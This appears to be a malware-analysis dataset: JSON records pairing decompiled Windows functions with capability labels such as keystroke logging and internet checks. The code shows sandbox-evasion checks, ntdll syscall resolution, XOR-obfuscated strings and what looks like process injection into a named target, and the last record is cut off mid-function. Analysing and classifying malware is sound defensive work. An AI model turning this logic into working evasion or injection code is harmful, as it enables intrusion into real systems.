{
    "null": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "14000118": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.140001180(void)\n\n{\n    int32_t iVar1;\n    char *pcVar2;\n    char cVar3;\n    int32_t iVar4;\n    uint64_t uVar5;\n    int32_t *piVar6;\n    uint64_t *puVar7;\n    int32_t *piVar8;\n    ulong uVar9;\n    code *pcVar10;\n    ulong uVar11;\n    char **ppcVar12;\n    char *pcVar13;\n    ulong *puVar14;\n    int64_t iVar15;\n    uint64_t uVar16;\n    bool bVar17;\n    int64_t iVar18;\n    int64_t iVar19;\n    ulong *puVar20;\n    int64_t in_GS_OFFSET;\n    ulong auStack152 [7];\n    uint8_t uStack92;\n    uint16_t uStack88;\n    \n    piVar6 = *0x140103690;\n    puVar20 = auStack152;\n    for (iVar18 = 0xd; iVar18 != 0; iVar18 = iVar18 + -1) {\n        *puVar20 = 0;\n        puVar20 = puVar20 + 1;\n    }\n    if (**0x140103690 != 0) {\n        (*_sym.imp.KERNEL32.dll_GetStartupInfoA)(auStack152);\n    }\n    pcVar10 = _sym.imp.KERNEL32.dll_Sleep;\n    puVar7 = *0x1401036e0;\n    uVar16 = *(*(in_GS_OFFSET + 0x30) + 8);\n    while( true ) {\n        LOCK();\n        uVar5 = *puVar7;\n        *puVar7 = *puVar7 ^ (uVar5 == 0) * (*puVar7 ^ uVar16);\n        uVar9 = *0x140103750;\n        uVar11 = *0x140103740;\n        piVar8 = *0x1401036f0;\n        uVar5 = (uVar5 != 0) * *puVar7;\n        if (uVar5 == 0) break;\n        if (uVar16 == uVar5) {\n            bVar17 = true;\n            iVar4 = **0x1401036f0;\n            goto joined_r0x000140001401;\n        }\n        (*pcVar10)(1000);\n    }\n    bVar17 = false;\n    iVar4 = **0x1401036f0;\njoined_r0x000140001401:\n    if (iVar4 == 1) {\n        sub.msvcrt.dll__amsg_exit(0x1f);\n        iVar4 = *piVar8;\n    }\n    else {\n        if (**0x1401036f0 == 0) {\n            **0x1401036f0 = 1;\n            sub.msvcrt.dll__initterm(uVar11, uVar9);\n        }\n        else {\n            *0x14012901c = 1;\n        }\n        iVar4 = *piVar8;\n    }\n    if (iVar4 == 1) {\n        sub.msvcrt.dll__initterm(*0x140103720, *0x140103730);\n        *piVar8 = 2;\n    }\n    if (!bVar17) {\n        *puVar7 = 0;\n    }\n    if (**0x140103620 != NULL) {\n        (***0x140103620)(0, 2);\n    }\n    fcn.14000dcc0();\n    uVar11 = (*_sym.imp.KERNEL32.dll_SetUnhandledExceptionFilter)(*0x140103790);\n    **0x1401036d0 = uVar11;\n    fcn.140017fb0(0x140001000);\n    fcn.14000dad0();\n    *0x140129010 = *0x140103640;\n    ppcVar12 = fcn.140017e00();\n    iVar4 = *0x140129038;\n    bVar17 = false;\n    pcVar13 = *ppcVar12;\n    if (pcVar13 != NULL) {\n        do {\n            cVar3 = *pcVar13;\n            if (cVar3 < '!') {\n                *0x140129008 = pcVar13;\n                if (cVar3 == '\\0') break;\n                if (!bVar17) goto code_r0x0001400012d0;\n                bVar17 = true;\n            }\n            else if (cVar3 == '\\\"') {\n                bVar17 = bVar17 ^ 1;\n            }\n            pcVar13 = pcVar13 + 1;\n        } while( true );\n    }\n    goto code_r0x0001400012f0;\ncode_r0x0001400012d0:\n    if (cVar3 != '\\0') {\n        do {\n            pcVar2 = pcVar13 + 1;\n            pcVar13 = pcVar13 + 1;\n            *0x140129008 = pcVar13;\n            if (*pcVar2 == '\\0') break;\n        } while (*pcVar2 < '!');\n    }\ncode_r0x0001400012f0:\n    if ((*piVar6 != 0) && (*0x1400b8000 = 10,  (uStack92 & 1) != 0)) {\n        *0x1400b8000 = uStack88;\n    }\n    iVar1 = *0x140129038 + 1;\n    puVar14 = sub.msvcrt.dll_malloc();\n    iVar18 = *0x140129030;\n    puVar20 = puVar14;\n    if (0 < iVar4) {\n        iVar19 = 0;\n        do {\n            iVar15 = sub.msvcrt.dll_strlen(*(iVar18 + iVar19));\n            uVar11 = sub.msvcrt.dll_malloc(iVar15 + 1);\n            *(puVar14 + iVar19) = uVar11;\n            puVar20 = iVar18 + iVar19;\n            iVar19 = iVar19 + 8;\n            sub.msvcrt.dll_memcpy(uVar11, *puVar20, iVar15 + 1);\n        } while (iVar19 != iVar1 * 8 + -8);\n        puVar20 = iVar19 + puVar14;\n    }\n    *puVar20 = 0;\n    *0x140129030 = puVar14;\n    fcn.14000d8d0();\n    ***0x140103650 = *0x140129028;\n    uVar16 = fcn.140003d05();\n    *0x140129024 = uVar16;\n    if (*0x140129020 == 0) {\n        sub.msvcrt.dll_exit(uVar16 & 0xffffffff);\n        **0x140103690 = 1;\n        uVar16 = fcn.140001180();\n        return uVar16;\n    }\n    if (*0x14012901c == 0) {\n        sub.msvcrt.dll__cexit();\n        return *0x140129024;\n    }\n    return uVar16;\n}\n",
        "token_count": 1534
    },
    "1400014f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.1400014f0(void)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = sub.msvcrt.dll__onexit();\n    return -(iVar1 == 0);\n}\n",
        "token_count": 46
    },
    "1400015e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Could not reconcile some variable overlaps\n\nulong fcn.1400015ee(void)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    uint uVar5;\n    ulong uVar6;\n    uint32_t *puVar7;\n    int16_t *arg1;\n    int64_t in_GS_OFFSET;\n    ulong var_a0h;\n    ulong var_98h;\n    ulong var_8ch;\n    ulong var_80h;\n    ulong var_78h;\n    ulong var_70h;\n    ulong var_68h;\n    ulong var_60h;\n    ulong var_50h;\n    ulong var_48h;\n    ulong var_40h;\n    ulong var_38h;\n    ulong var_30h;\n    ulong *var_28h;\n    int64_t var_20h;\n    int64_t var_18h;\n    ulong var_10h;\n    ulong var_8h;\n    \n    if (*0x1400b8020 == 0) {\n        var_18h = 0;\n        var_20h = 0;\n        for (var_28h = *(*(*(in_GS_OFFSET + 0x60) + 0x18) + 0x10); var_28h[6] != 0; var_28h = *var_28h) {\n            var_20h = var_28h[6];\n            uVar1 = *(var_20h + *(var_20h + 0x3c) + 0x88);\n            if (uVar1 != 0) {\n                var_18h = var_20h + uVar1;\n                puVar7 = var_20h + *(var_18h + 0xc);\n                if (((*puVar7 | 0x20202020) == 0x6c64746e) && ((puVar7[1] | 0x20202020) == 0x6c642e6c)) break;\n            }\n        }\n        if (var_18h == 0) {\n            uVar6 = 0;\n        }\n        else {\n            var_30h._4_4_ = *(var_18h + 0x18);\n            uVar1 = *(var_18h + 0x1c);\n            uVar2 = *(var_18h + 0x20);\n            uVar3 = *(var_18h + 0x24);\n            var_30h._0_4_ = 0;\n            do {\n                arg1 = var_20h + *(var_20h + uVar2 + (var_30h._4_4_ - 1) * 4);\n                if (*arg1 == 0x775a) {\n                    uVar5 = fcn.140001590(arg1);\n                    *(var_30h * 8 + 0x1400b8024) = uVar5;\n                    *(var_30h * 8 + 0x1400b8028) = *(var_20h + uVar1 + *(var_20h + uVar3 + (var_30h._4_4_ - 1) * 2) * 4)\n                    ;\n                    var_30h._0_4_ = var_30h + 1;\n                    if (var_30h == 500) break;\n                }\n                var_30h._4_4_ = var_30h._4_4_ + -1;\n            } while (var_30h._4_4_ != 0);\n            *0x1400b8020 = var_30h;\n            for (var_38h._4_4_ = 0; var_38h._4_4_ < *0x1400b8020 - 1; var_38h._4_4_ = var_38h._4_4_ + 1) {\n                for (var_38h._0_4_ = 0; var_38h < (*0x1400b8020 - var_38h._4_4_) - 1; var_38h._0_4_ = var_38h + 1) {\n                    if (*((var_38h + 1) * 8 + 0x1400b8028) < *(var_38h * 8 + 0x1400b8028)) {\n                        uVar5 = *(var_38h * 8 + 0x1400b8024);\n                        uVar4 = *(var_38h * 8 + 0x1400b8028);\n                        *(var_38h * 8 + 0x1400b8024) = *((var_38h + 1) * 8 + 0x1400b8024);\n                        *(var_38h * 8 + 0x1400b8028) = *((var_38h + 1) * 8 + 0x1400b8028);\n                        *((var_38h + 1) * 8 + 0x1400b8024) = uVar5;\n                        *((var_38h + 1) * 8 + 0x1400b8028) = uVar4;\n                    }\n                }\n            }\n            uVar6 = 1;\n        }\n    }\n    else {\n        uVar6 = 1;\n    }\n    return uVar6;\n}\n",
        "token_count": 1219
    },
    "140001eb": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.140001ebb(ulong param_1, ulong param_2, ulong param_3, ulong param_4)\n\n{\n    ulong uVar1;\n    int64_t iVar2;\n    ulong var_10h;\n    ulong var_30h;\n    ulong var_50h;\n    ulong var_58h;\n    ulong var_62h;\n    ulong var_70h;\n    ulong var_78h;\n    ulong auStack232 [2];\n    ulong uStack214;\n    ulong uStack192;\n    uint auStack184 [2];\n    uint64_t uStack176;\n    uchar auStack120 [16];\n    ulong var_60h;\n    ulong var_58h_2;\n    uchar auStack88 [2];\n    ulong var_4eh;\n    ulong var_38h;\n    ulong var_30h_2;\n    ulong var_28h;\n    ulong uStack38;\n    int64_t iStack16;\n    \n    (*_sym.imp.KERNEL32.dll_GetSystemInfo)(auStack120);\n    if (_auStack88 < 2) {\n        uVar1 = 1;\n    }\n    else {\n        auStack184[0] = 0x40;\n        (*_sym.imp.KERNEL32.dll_GlobalMemoryStatusEx)(auStack184);\n        if (uStack176 < 0x80000000) {\n            uVar1 = 1;\n        }\n        else {\n            iStack16 = (*_sym.imp.KERNEL32.dll_GetTickCount64)();\n            uStack192 = 0xffffffffdc3cba00;\n            fcn.140001dda(&var_30h_2, &var_38h + 7);\n            auStack232[0] = var_30h_2;\n            uStack214 = uStack38;\n            fcn.1400189b0(auStack232);\n            fcn.140001d99(0, &uStack192, param_3, param_4);\n            iVar2 = (*_sym.imp.KERNEL32.dll_GetTickCount64)();\n            if (iVar2 - iStack16 < 60000) {\n                uVar1 = 1;\n            }\n            else {\n                uVar1 = 0;\n            }\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 486
    },
    "140001fb": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t fcn.140001fb0(ulong arg1)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    ulong arg2;\n    ulong in_R8;\n    ulong in_R9;\n    ulong *arg4;\n    ulong var_110h;\n    ulong var_118h;\n    ulong var_130h;\n    uint auStack392 [2];\n    ulong uStack384;\n    ulong uStack376;\n    uint uStack368;\n    ulong uStack360;\n    ulong uStack352;\n    ulong uStack344;\n    ulong uStack336;\n    uint auStack328 [2];\n    uint32_t uStack320;\n    uchar auStack284 [180];\n    ulong var_60h;\n    ulong var_58h;\n    ulong var_50h;\n    ulong var_48h;\n    ulong var_40h;\n    ulong var_38h;\n    ulong var_30h;\n    ulong var_28h;\n    ulong var_20h;\n    ulong var_18h;\n    int64_t iStack24;\n    ulong uStack16;\n    \n    iStack24 = 0;\n    auStack328[0] = 0x130;\n    uStack16 = sub.KERNEL32.dll_CreateToolhelp32Snapshot(2, 0);\n    puVar2 = auStack328;\n    iVar1 = sub.KERNEL32.dll_Process32First(uStack16);\n    if (iVar1 == 1) {\n        do {\n            puVar2 = auStack328;\n            iVar1 = sub.KERNEL32.dll_Process32Next(uStack16);\n            if (iVar1 != 1) goto code_r0x000140002109;\n            iVar1 = sub.msvcrt.dll__stricmp(auStack284, arg1);\n        } while (iVar1 != 0);\n        uStack336 = 0;\n        uStack344 = fcn.140001584(uStack320);\n        auStack392[0] = 0x30;\n        uStack384 = 0;\n        uStack368 = 0;\n        uStack376 = 0;\n        uStack360 = 0;\n        uStack352 = 0;\n        arg4 = &uStack344;\n        puVar2 = auStack392;\n        arg2 = 0x1fffff;\n        fcn.140001b91(&iStack24, 0x1fffff, puVar2, arg4);\n        if ((iStack24 == 0) || (iStack24 == -1)) {\n            fcn.140001b50(uStack16, arg2, puVar2, arg4);\n            iStack24 = -1;\n        }\n        else {\n            fcn.140001b50(uStack16, arg2, puVar2, arg4);\n        }\n    }\n    else {\ncode_r0x000140002109:\n        fcn.140001b50(uStack16, puVar2, in_R8, in_R9);\n        iStack24 = -1;\n    }\n    return iStack24;\n}\n",
        "token_count": 654
    },
    "140003d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x000140003deb)\n// WARNING: Could not reconcile some variable overlaps\n\nulong fcn.140003d05(void)\n\n{\n    uint64_t uVar1;\n    int32_t iVar2;\n    ulong uVar3;\n    ulong *arg4;\n    ulong uVar4;\n    ulong var_8h;\n    ulong var_18h_2;\n    ulong var_20h;\n    ulong var_28h;\n    ulong var_40h;\n    ulong var_48h_2;\n    ulong var_50h;\n    ulong var_58h;\n    ulong var_60h;\n    ulong var_68h;\n    ulong var_70h;\n    ulong var_78h;\n    ulong var_90h;\n    ulong var_98h;\n    ulong var_b3h;\n    ulong var_c0h;\n    ulong var_ceh;\n    ulong var_d8h;\n    ulong var_e0h;\n    ulong var_e8h;\n    ulong var_f0h;\n    ulong var_f8h;\n    ulong var_100h;\n    ulong var_108h;\n    ulong var_114h;\n    ulong var_120h;\n    ulong var_128h;\n    ulong var_130h;\n    ulong var_138h;\n    ulong var_140h;\n    ulong var_148h;\n    ulong var_150h;\n    ulong var_158h;\n    ulong var_161h;\n    ulong var_170h;\n    ulong var_178h;\n    ulong var_180h;\n    ulong var_188h;\n    ulong var_190h;\n    ulong var_198h;\n    ulong var_1a0h;\n    ulong var_1a8h;\n    ulong var_1b2h;\n    ulong var_1c0h;\n    ulong var_1c8h;\n    ulong var_1d0h;\n    ulong var_1d8h;\n    ulong var_1e0h;\n    ulong var_1e8h;\n    ulong var_1f0h;\n    ulong var_1f8h;\n    ulong var_204h;\n    ulong var_210h;\n    ulong var_218h;\n    ulong var_220h;\n    ulong var_228h;\n    ulong var_230h;\n    ulong var_238h;\n    ulong var_250h;\n    ulong var_258h;\n    ulong var_260h;\n    ulong var_268h;\n    ulong var_270h;\n    ulong var_278h;\n    ulong var_290h;\n    ulong var_298h;\n    ulong var_2a0h;\n    ulong var_2a8h;\n    ulong var_2b0h;\n    ulong var_2b8h;\n    ulong var_2c1h;\n    ulong var_2d0h;\n    ulong var_2d8h;\n    ulong var_2e0h;\n    ulong var_2e8h;\n    ulong var_2f0h;\n    ulong var_2f8h;\n    ulong var_305h;\n    ulong var_310h;\n    ulong var_318h;\n    ulong var_320h;\n    ulong var_328h;\n    ulong var_336h;\n    ulong var_340h;\n    ulong var_348h;\n    ulong var_350h;\n    ulong var_358h;\n    ulong var_360h;\n    ulong var_368h;\n    ulong var_370h;\n    ulong var_378h;\n    ulong var_380h;\n    ulong var_388h;\n    ulong var_390h;\n    ulong var_3a0h;\n    ulong var_3a8h;\n    ulong var_3b0h;\n    ulong var_3b8h;\n    ulong var_3c0h;\n    ulong var_3c8h;\n    ulong var_3d0h;\n    ulong var_3dch;\n    ulong uStack1080;\n    ulong uStack1072;\n    ulong uStack1064;\n    unkbyte6 Stack1056;\n    ushort uStack1050;\n    unkbyte6 Stack1048;\n    ushort uStack1042;\n    uchar uStack1040;\n    uint uStack1039;\n    uchar uStack1035;\n    uchar uStack1034;\n    uchar uStack1033;\n    uchar uStack1032;\n    ushort uStack1031;\n    ushort uStack1029;\n    ushort uStack1027;\n    uchar uStack1025;\n    uchar uStack1024;\n    uchar uStack1023;\n    ushort uStack1022;\n    uint32_t uStack1020;\n    uchar uStack1016;\n    uchar uStack1015;\n    ushort uStack1014;\n    unkbyte5 Stack1012;\n    uchar uStack1007;\n    ushort uStack1006;\n    ulong uStack1000;\n    unkbyte6 Stack992;\n    ushort uStack986;\n    unkbyte6 Stack984;\n    ushort uStack978;\n    ulong uStack976;\n    int64_t iStack968;\n    int64_t iStack960;\n    ulong auStack936 [2];\n    ulong uStack920;\n    uint uStack912;\n    uchar uStack905;\n    ulong uStack904;\n    ulong uStack896;\n    ulong uStack888;\n    ulong uStack880;\n    uchar uStack857;\n    ulong auStack856 [4];\n    uint8_t auStack821 [12];\n    char cStack809;\n    uchar uStack808;\n    uint8_t auStack807 [12];\n    char cStack795;\n    uchar uStack794;\n    uchar uStack793;\n    ulong uStack792;\n    ulong uStack784;\n    ulong uStack776;\n    ulong uStack768;\n    ulong uStack760;\n    ulong uStack752;\n    ulong uStack744;\n    uint uStack736;\n    uint uStack728;\n    ulong uStack724;\n    uchar uStack713;\n    ulong uStack712;\n    ulong uStack704;\n    ulong uStack696;\n    ulong uStack688;\n    ulong uStack680;\n    ulong uStack672;\n    ulong uStack664;\n    unkbyte7 Stack655;\n    ulong uStack647;\n    uchar uStack633;\n    ulong uStack632;\n    ulong uStack624;\n    ulong uStack616;\n    ulong uStack608;\n    ulong uStack600;\n    ulong uStack592;\n    ulong uStack584;\n    ushort uStack576;\n    unkbyte6 Stack574;\n    ushort uStack568;\n    ulong uStack566;\n    uchar uStack553;\n    ulong uStack552;\n    ulong uStack544;\n    ulong uStack536;\n    ulong uStack528;\n    ulong uStack520;\n    ulong uStack512;\n    ulong uStack504;\n    uint uStack496;\n    uint32_t uStack492;\n    uint uStack488;\n    ulong uStack484;\n    uchar uStack473;\n    ulong uStack472;\n    ulong uStack464;\n    ulong uStack456;\n    ulong uStack448;\n    ulong uStack440;\n    unkuint7 Stack432;\n    uint uStack425;\n    uchar uStack409;\n    ulong uStack408;\n    ulong uStack400;\n    ulong uStack392;\n    ulong uStack384;\n    ulong uStack376;\n    unkbyte7 Stack368;\n    uchar uStack361;\n    unkbyte7 Stack360;\n    uchar uStack345;\n    ulong uStack344;\n    ulong uStack336;\n    ulong uStack328;\n    ulong uStack320;\n    ulong uStack312;\n    unkbyte7 Stack303;\n    ulong uStack295;\n    uchar uStack281;\n    ulong uStack280;\n    ulong uStack272;\n    ulong uStack264;\n    ulong uStack256;\n    ulong uStack248;\n    unkbyte5 Stack240;\n    unkbyte3 Stack235;\n    unkbyte5 Stack232;\n    ulong uStack227;\n    uchar uStack217;\n    ulong uStack216;\n    ulong uStack208;\n    ulong uStack200;\n    ulong uStack178;\n    uchar uStack169;\n    ulong uStack168;\n    ulong uStack160;\n    ulong uStack152;\n    ulong uStack144;\n    ulong uStack136;\n    ulong uStack128;\n    uchar uStack120;\n    int32_t iStack116;\n    uint8_t *puStack112;\n    uint8_t *puStack104;\n    uint8_t *puStack96;\n    uint8_t *var_50h_2;\n    ulong var_48h;\n    uint8_t *var_40h_2;\n    uint8_t *var_38h;\n    uint8_t *var_30h;\n    uint8_t *var_28h_2;\n    int64_t var_20h_2;\n    int64_t var_18h;\n    uchar uStack24;\n    ulong var_fh;\n    uint32_t uStack12;\n    \n    fcn.14000d8d0();\n    uStack912 = 0;\n    uStack920 = 0;\n    auStack936[0] = *0x1400f93e0;\n    iVar2 = fcn.140001ebb();\n    if (iVar2 == 0) {\n        fcn.14000274c(auStack856, &uStack857);\n        uStack1000 = auStack856[0];\n        fcn.1400188d0(&uStack1000);\n        fcn.140002485(str._WL_XE);\n        uStack12 = 0xffffffff;\n        fcn.14000280e(auStack821, &uStack808);\n        var_30h = auStack821;\n        if (cStack809 != '\\0') {\n            for (var_48h._4_4_ = 0; var_40h_2 = var_30h,  var_38h = var_30h,  var_48h._4_4_ < 0xd;\n                var_48h._4_4_ = var_48h._4_4_ + 1) {\n                var_30h[var_48h._4_4_] = var_30h[var_48h._4_4_] ^ var_48h._4_4_ + (var_48h._4_4_ / 0x36) * -0x36 + 0x35U\n                ;\n            }\n        }\n        var_28h_2 = var_30h;\n        _uStack24 = fcn.140001fb0(auStack821);\n        if (_uStack24 != -1) {\n            fcn.140002888(auStack807, &uStack794);\n            puStack96 = auStack807;\n            if (cStack795 != '\\0') {\n                for (iStack116 = 0; puStack112 = puStack96,  puStack104 = puStack96,  iStack116 < 0xd;\n                    iStack116 = iStack116 + 1) {\n                    puStack96[iStack116] = puStack96[iStack116] ^ iStack116 + (iStack116 / 0x36) * -0x36 + 0x35U;\n                }\n            }\n            var_50h_2 = puStack96;\n            fcn.140002128(&iStack968, auStack807, _uStack24);\n            if ((iStack968 != -1) && (iStack960 != -1)) {\n                var_18h = iStack968;\n                var_20h_2 = iStack960;\n                arg4 = auStack936;\n                uVar3 = 0;\n                uStack12 = fcn.140001bd2(iStack968, &uStack920, 0, arg4);\n                if (uStack12 == 0) {\n                    fcn.140002b74(&uStack712, &uStack713);\n                    uStack1080 = uStack712;\n                    uStack1072 = uStack704;\n                    uStack1064 = uStack696;\n                    Stack1056 = uStack688;\n                    uStack1050 = uStack688 >> 0x30;\n                    Stack1048 = uStack680;\n                    uStack1042 = uStack680 >> 0x30;\n                    uStack1040 = uStack672;\n                    uStack1039 = uStack672 >> 8;\n                    uStack1035 = uStack672 >> 0x28;\n                    uStack1034 = uStack672 >> 0x30;\n                    uStack1033 = uStack672 >> 0x38;\n                    uStack1032 = uStack664;\n                    uStack1031 = uStack664 >> 8;\n                    uStack1029 = uStack664 >> 0x18;\n                    uStack1027 = uStack664 >> 0x28;\n                    uStack1025 = uStack664 >> 0x38;\n                    uStack1023 = Stack655;\n                    uStack1022 = Stack655 >> 8;\n                    uStack1020 = Stack655 >> 0x18;\n                    uStack1015 = uStack647;\n                    uStack1014 = uStack647 >> 8;\n                    Stack1012 = uStack647 >> 0x18;\n                    fcn.1400190e0(&uStack1080, uStack647, uVar3, arg4);\n                    uVar3 = *0x140129040;\n                    uVar4 = *0x1400f93e0;\n                    uStack12 = fcn.140001ace(var_18h, uStack920, *0x140129040, *0x1400f93e0);\n                    if (uStack12 == 0) {\n                        fcn.140003030(&uStack552, &uStack553);\n                        uStack1080 = uStack552;\n                        uStack1072 = uStack544;\n                        uStack1064 = uStack536;\n                        Stack1056 = uStack528;\n                        uStack1050 = uStack528 >> 0x30;\n                        Stack1048 = uStack520;\n                        uStack1042 = uStack520 >> 0x30;\n                        uStack1040 = uStack512;\n                        uStack1039 = uStack512 >> 8;\n                        uStack1035 = uStack512 >> 0x28;\n                        uStack1034 = uStack512 >> 0x30;\n                        uStack1033 = uStack512 >> 0x38;\n                        uStack1032 = uStack504;\n                        uStack1031 = uStack504 >> 8;\n                        uStack1029 = uStack504 >> 0x18;\n                        uStack1027 = uStack504 >> 0x28;\n                        uStack1025 = uStack504 >> 0x38;\n                        uStack1024 = uStack496;\n                        uStack1023 = uStack496 >> 8;\n                        uStack1022 = uStack496 >> 0x10;\n                        uStack1020 = uStack492;\n                        uStack1016 = uStack488;\n                        uStack1015 = uStack488 >> 8;\n                        uStack1014 = uStack488 >> 0x10;\n                        Stack1012 = uStack484;\n                        uStack1007 = uStack484 >> 0x28;\n                        uStack1006 = uStack484 >> 0x30;\n                        fcn.1400192b0(&uStack1080, uStack484, uVar3, uVar4);\n                        uVar4 = 0x20;\n                        uVar3 = 0x1400f93e0;\n                        uStack12 = fcn.140001a8d(var_18h, &uStack920, 0x1400f93e0, 0x20);\n                        if (uStack12 == 0) {\n                            fcn.14000344c(&uStack408, &uStack409);\n                            uStack1080 = uStack408;\n                            uStack1072 = uStack400;\n                            uStack1064 = uStack392;\n                            Stack1056 = uStack384;\n                            uStack1050 = uStack384 >> 0x30;\n                            Stack1048 = uStack376;\n                            uStack1042 = uStack376 >> 0x30;\n                            uStack1040 = Stack368;\n                            uStack1039 = Stack368 >> 8;\n                            uStack1035 = Stack368 >> 0x28;\n                            uStack1034 = Stack368 >> 0x30;\n                            uStack1032 = Stack360;\n                            uStack1031 = Stack360 >> 8;\n                            uStack1029 = Stack360 >> 0x18;\n                            uStack1027 = Stack360 >> 0x28;\n                            fcn.140018e30(&uStack1080, CONCAT17(uStack361, Stack368), uVar3, uVar4);\n                            uVar4 = 0;\n                            uVar3 = 0;\n                            uStack12 = fcn.140001c95(var_20h_2, uStack920, 0, 0);\n                            if (uStack12 == 0) {\n                                fcn.1400037f0(&uStack280, &uStack281);\n                                uStack1080 = uStack280;\n                                uStack1072 = uStack272;\n                                uStack1064 = uStack264;\n                                Stack1056 = uStack256;\n                                uStack1050 = uStack256 >> 0x30;\n                                Stack1048 = uStack248;\n                                uStack1042 = uStack248 >> 0x30;\n                                uStack1040 = Stack240;\n                                uStack1039 = Stack240 >> 8;\n                                uStack1035 = Stack235;\n                                uStack1034 = Stack235 >> 8;\n                                uStack1033 = Stack235 >> 0x10;\n                                uStack1032 = Stack232;\n                                uStack1031 = Stack232 >> 8;\n                                uStack1029 = Stack232 >> 0x18;\n                                uStack1027 = uStack227;\n                                uStack1025 = uStack227 >> 0x10;\n                                uStack1024 = uStack227 >> 0x18;\n                                uStack1023 = uStack227 >> 0x20;\n                                uStack1022 = uStack227 >> 0x28;\n                                uStack1020._0_1_ = uStack227 >> 0x38;\n                                uStack1020 = uStack1020 & 0xffffff00 | uStack1020;\n                                fcn.140019000(&uStack1080, uStack227, uVar3, uVar4);\n                                uStack12 = fcn.140001cd6(var_20h_2, 0, uVar3, uVar4);\n                                if (uStack12 == 0) {\n                                    fcn.140003b6c(&uStack168, &uStack169);\n                                    uStack1080 = uStack168;\n                                    uStack1072 = uStack160;\n                                    uStack1064 = uStack152;\n                                    Stack1056 = uStack144;\n                                    uStack1050 = uStack144 >> 0x30;\n                                    Stack1048 = uStack136;\n                                    uStack1042 = uStack136 >> 0x30;\n                                    uStack1040 = uStack128;\n                                    uStack1039 = uStack128 >> 8;\n                                    uStack1035 = uStack128 >> 0x28;\n                                    uStack1034 = uStack128 >> 0x30;\n                                    uStack1033 = uStack128 >> 0x38;\n                                    uStack1032 = uStack120;\n                                    fcn.140018c60(&uStack1080, uStack128, uVar3, uVar4);\n                                    fcn.140001b50(var_18h, uStack128, uVar3, uVar4);\n                                    fcn.140001b50(var_20h_2, uStack128, uVar3, uVar4);\n                                }\n                                else {\n                                    fcn.1400039ea(&uStack216, &uStack217);\n                                    uStack1080 = uStack216;\n                                    uStack1072 = uStack208;\n                                    uStack1064 = uStack200;\n                                    uStack1042 = uStack178;\n                                    uStack1040 = uStack178 >> 0x10;\n                                    uStack1039 = uStack178 >> 0x18;\n                                    uStack1035 = uStack178 >> 0x38;\n                                    fcn.140018b70(&uStack1080, uStack12, uVar3, uVar4);\n                                }\n                            }\n                            else {\n                                fcn.140003616(&uStack344, &uStack345);\n                                uStack1080 = uStack344;\n                                uStack1072 = uStack336;\n                                uStack1064 = uStack328;\n                                Stack1056 = uStack320;\n                                uStack1050 = uStack320 >> 0x30;\n                                Stack1048 = uStack312;\n                                uStack1042 = uStack312 >> 0x30;\n                                uStack1039 = Stack303;\n                                uStack1035 = Stack303 >> 0x20;\n                                uStack1034 = Stack303 >> 0x28;\n                                uStack1033 = Stack303 >> 0x30;\n                                uStack1031 = uStack295;\n                                uStack1029 = uStack295 >> 0x10;\n                                uStack1027 = uStack295 >> 0x20;\n                                uStack1025 = uStack295 >> 0x30;\n                                uStack1024 = uStack295 >> 0x38;\n                                